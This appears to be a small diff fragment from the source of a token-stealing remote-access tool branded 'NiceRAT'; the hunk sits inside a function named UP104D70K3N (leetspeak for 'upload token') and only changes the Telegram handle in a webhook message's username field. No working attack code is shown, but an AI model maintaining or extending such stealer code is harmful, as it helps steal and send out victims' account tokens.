@@ -520,7 +520,7 @@ def UP104D70K3N(token, path):
                 }
             }
         ],
-        "username": f"NiceRAT | t.me/NiceRAT",
+        "username": f"NiceRAT | t.me/NicestRAT",
         "avatar_url": "https://i.imgur.com/iFl9pJK.png",
         "attachments": []
         }
